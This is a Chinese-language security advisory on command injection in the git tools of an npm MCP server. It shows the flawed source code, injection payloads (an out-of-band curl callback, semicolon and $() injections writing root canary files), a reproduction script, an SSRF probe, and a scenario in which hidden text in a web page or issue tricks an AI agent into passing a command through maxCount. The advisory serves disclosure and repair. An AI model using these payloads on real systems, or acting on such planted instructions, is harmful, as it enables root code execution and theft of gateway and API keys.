---
id: MCPVULN-002
mcp_service: omni-mcp-server
mcp_version: 1.1.1
mcp_package: "@bitofacoder/omni-mcp-server@1.1.1"
source: npm
tool: git_commit, git_log（系统性，疑似全部 git_* 工具）
param: message, maxCount
vuln_type: command_injection
cwe: CWE-78
severity: critical
status: confirmed
confirmed_exploitable: true
detection_channel: oob + differential（判定器）；分号/命令替换/参数注入（人工复核实测）
detected_by: mcpfuzz v2
discovered: 2026-11-01
target_env: "mcphub gateway /mcp/io.github.bitofacoder_omni-mcp-server（stdio 跑在网关容器内，容器以 root 运行）"
---

# 漏洞说明：omni-mcp-server 的 git 工具命令注入（容器内 root RCE）

| 项 | 内容 |
|---|---|
| 组件 | `@bitofacoder/omni-mcp-server@1.1.1`（经 mcphub 网关以 stdio 接入） |
| 端点 | `http://<gateway>:3000/mcp/io.github.bitofacoder_omni-mcp-server` |
| 工具/参数 | `git_commit.message`、`git_log.maxCount`（注入点，检测器自动定位；经复核为系统性，疑似所有 git_* 工具都把参数经 shell 拼接 git 命令） |
| 类型 | 命令注入 / 任意命令执行（CWE-78） |
| 严重程度 | **严重（Critical）** —— 以 root 在网关容器内任意执行、可窃取网关密钥、影响同容器所有 MCP |
| 发现方式 | mcpfuzz 黑盒检测（git_commit 走 OOB 回连、git_log 走差分 `--help` 命中）；人工复核实测分号 `;` 与命令替换 `$()` 均真实执行 |

## 1. 与"本职功能"的区别（为什么这是真漏洞，而非终端类工具的设计危险）

与 `interactive-terminal`、`shell-exec` 这类"本职即执行命令"的工具不同，**omni-mcp-server 的 `git_commit` 自我描述是"Commit currently staged changes with a specific message"、`git_log` 是"Run git log to see recent commit history"**——两者都**不是命令执行工具**。调用方给出的 `message`/`maxCount` 本应只作为 git 的提交信息/条数，却被拼进 shell 命令行并被 shell 解释执行。这是一个**真正的注入漏洞**（信任边界被越过），不是"工具本职功能"。

## 2. 威胁模型（容器即宿主）

网关 mcphub 部署在 Docker 容器里，各 MCP 以 stdio 子进程跑在同一容器内，且**容器以 root（uid=0）运行**。对该 MCP 而言其"宿主机"就是这个容器；能危害到容器（root 执行、读网关凭据、影响同容器网关与其它 MCP）即构成真实危害，无需逃逸物理机。详见 [MCPVULN-001](MCPVULN-001-interactive-terminal-rce.md) §1/§5（同一容器、同一威胁模型）。

## 3. 根因（真实源码，`dist/tools/git.js`）

该 MCP 用 Node 的 `exec()`（= `/bin/sh -c "<字符串>"`）**字符串拼接**执行 git，而非用 argv 数组参数化调用。两个注入点：

**git_log —— 零校验拼接：**
```js
const maxCount = args?.maxCount || 10;
const { stdout, stderr } = await execAsync(`git log -n ${maxCount}`);
```
`maxCount` 在 schema 里标 `type: 'number'`，但服务端**未真正强制该类型**，handler 直接取 `args.maxCount` 拼进命令行。传字符串 `"5; id"` 即变成 `/bin/sh -c "git log -n 5; id"`，分号后命令执行。

**git_commit —— 只防引号的假消毒：**
```js
const { message } = request.params.arguments;
const safeMessage = message.replace(/"/g, '\\"');   // 注释自称 "Escape quotes securely"
const { stdout, stderr } = await execAsync(`git commit -m "${safeMessage}"`);
```
开发者只把 `"` 转义成 `\"` 就自认安全，但 **`$(...)` / 反引号在双引号内无需引号即可生效**，`"$(id)"` 照样执行 → 消毒形同虚设。

> 根因一句话：**用户可控参数经 `exec()`（走 shell）拼接进命令行。** `git_log` 连校验都没有，`git_commit` 做了个只防引号、不防命令替换的假消毒。正确写法应为 `execFile('git', ['log','-n',String(n)])` 等 argv 参数化调用。

## 4. 实测证据（均在网关容器内以 root 执行，canary 经 `docker exec mcphub` 核验）

判定器的原始命中（第一批扫描）：
- `git_commit.message = $(curl http://<oob>/<token>)` → OOB 服务器收到回连，`ua=curl/8.14.1`（证明 `$()` 被 shell 执行、容器真的发起了 curl）。
- `git_log.maxCount = --help` → 差分通道命中 `usage: git log ...`（证明 `maxCount` 未经校验流入 git argv）。

人工复核（2026-11-01，经 `/mcp/{server}` 调用，注入后进容器核验文件落地）：

**git_commit.message —— 命令替换执行**
```
message = $(id > /tmp/mcpf_poc_gitcommit 2>&1)
→ git commit 本身因未配置身份而报 "Author identity unknown"（git 确实被调起）
→ docker exec mcphub cat /tmp/mcpf_poc_gitcommit:
   uid=0 gid=0(root) groups=0(root)          ← 注入的 id 已以 root 执行并写盘
```

**git_log.maxCount —— 分号注入 / 命令替换 / 参数注入三种都成立**
```
maxCount = "5; id > /tmp/mcpf_gitlog_semi"    → /tmp/mcpf_gitlog_semi = uid=0(root)...   （is_error=false，静默执行）
maxCount = "$(id > /tmp/mcpf_gitlog_subst)"   → /tmp/mcpf_gitlog_subst = uid=0(root)...
maxCount = "5 --output=/tmp/mcpf_gitlog_split"→ git 以 --output 写出任意文件（参数注入，文件生成）
```
三个 canary 文件均为 owner=root、内容为 `id` 的真实输出，确证**任意命令以 root 执行**。

## 5. 影响（Impact）

任何能访问该 MCP 端点者、或被赋予该 MCP 的 AI 智能体，调用看似无害的 `git_commit`/`git_log` 即可：
1. 以 root 在网关容器内**任意命令执行**；
2. 读取同容器网关配置 `/app/data/mcp_settings.json`，**窃取网关 Bearer 鉴权密钥与多个 LLM/云 API Key**（同 [MCPVULN-001](MCPVULN-001-interactive-terminal-rce.md) §4 证据3，为同一容器同一文件）；
3. 攻陷同容器的其它 MCP 后端与网关本体（DoS / 窃取运行时密钥）；
4. 以此横向/外带。
整个 MCP 网关及其后端生态在此容器内完全沦陷。

## 5b. 可利用性论证（即使本地 stdio 部署也算真漏洞）

常见反驳："若用户在本地以 stdio 方式部署给单个智能体用，没有远程攻击者，还算漏洞吗？"回应：

1. **漏洞存在性是代码属性、与传输无关。** CWE-78 注入在 `git.js` 里客观存在；部署方式只影响"可利用性/严重度"，不影响"是否是漏洞"。
2. **能力契约被打破 = 权限提升。** `git_log`/`git_commit` 声称只做受限 git 操作，宿主/用户常据此将其视为"安全工具"甚至自动批准。注入把"看日志/写提交"变成任意 RCE，**击穿了授权所依据的能力边界**。该部署里可能**根本没有** shell 工具，RCE 能力是漏洞凭空造出的。
3. **omni 自带投递链，自成致命组合。** 同一服务器里既有拉取外部不可信内容的工具（`web_fetch`/`github_get_issue`/`slack`），又有本 RCE sink。"抓这个 URL / 看这个 issue 再 commit 个总结"这类用法中，攻击者只需在网页/issue 里藏一句话诱导智能体用 `maxCount:"10; <命令>"` 调 git_log，即可在用户本机 RCE——**全程不需触碰 MCP 端口**。
4. **常以远程/托管/共享部署。** 本包发布于 MCP 市场、我们实测即经 mcphub 网关以 streamable HTTP 暴露；任何"非单一可信用户可达端点"的场景都有明确远程攻击者 + 服务端 RCE。

> 范围说明：上述第 3 条中的提示注入仅作为**到达服务端注入点的投递路径**，受害落点是服务器/宿主机（RCE），属服务端危害，与"排除对智能体本身的攻击"不冲突。

## 6. 复现（最小命令）

```bash
# 需先在网关启用该后端（toggle enabled=true）并预热；经 /mcp/{server} 调用
python - <<'PY'
from mcpfuzz.driver import call_tool_sync
S="io.github.bitofacoder_omni-mcp-server"
U=f"http://127.0.0.1:3000/mcp/{S}"
print(call_tool_sync(U, f"{S}-git_log", {"maxCount":"$(id > /tmp/poc_omni)"})["text"])
PY
# 核验：docker exec mcphub cat /tmp/poc_omni  → uid=0(root) gid=0(root) ...
```

## 6b. 附：同服务的其它问题（次要）

复核"疑似"条目时在 omni 上另发现：
- **`web_fetch.url` 存在 SSRF**：无内网/链路本地过滤——`web_fetch("http://127.0.0.1:3000/api/servers")` 返回 `401`（证明连上了只有内网可达的网关管理 API），`http://127.0.0.1:3000/` 可达。相比之下同批的 `ashlrai/webfetch` 对内网/元数据统一 `host blocked by policy`。本项因 omni 已是 root RCE 而严重度相对次要，但独立看仍是一个 SSRF 缺陷，修复应加内网/链路本地/元数据地址黑名单。
- `system_read_file.path` / `system_list_dir.path` 为按路径读文件/列目录（设计即如此），非独立注入漏洞。

## 7. 修复建议

- git 工具必须**用 argv 数组参数化调用**（如 `execFile("git",["log","-n",str(n)])`），**禁止经 shell 字符串拼接**；
- 对 `maxCount` 等数值参数做**严格整数校验**，对 `message` 等文本参数不经 shell 传递；
- 收紧注入面后，仍建议将后端置于非 root、与网关密钥隔离的环境（见 [MCPVULN-001](MCPVULN-001-interactive-terminal-rce.md) §8）。
